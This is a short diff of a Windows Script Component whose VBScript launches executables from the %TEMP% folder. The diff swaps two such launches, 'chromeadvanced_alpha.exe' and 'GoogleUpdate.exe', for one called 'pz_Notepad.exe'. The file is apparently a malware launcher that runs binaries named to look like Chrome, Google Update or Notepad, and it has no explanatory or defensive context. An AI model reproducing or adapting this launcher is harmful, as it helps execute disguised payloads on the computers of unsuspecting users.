@@ -1,7 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\chromeadvanced_alpha.exe")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\GoogleUpdate.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\pz_Notepad.exe")
 </script>
 </component>
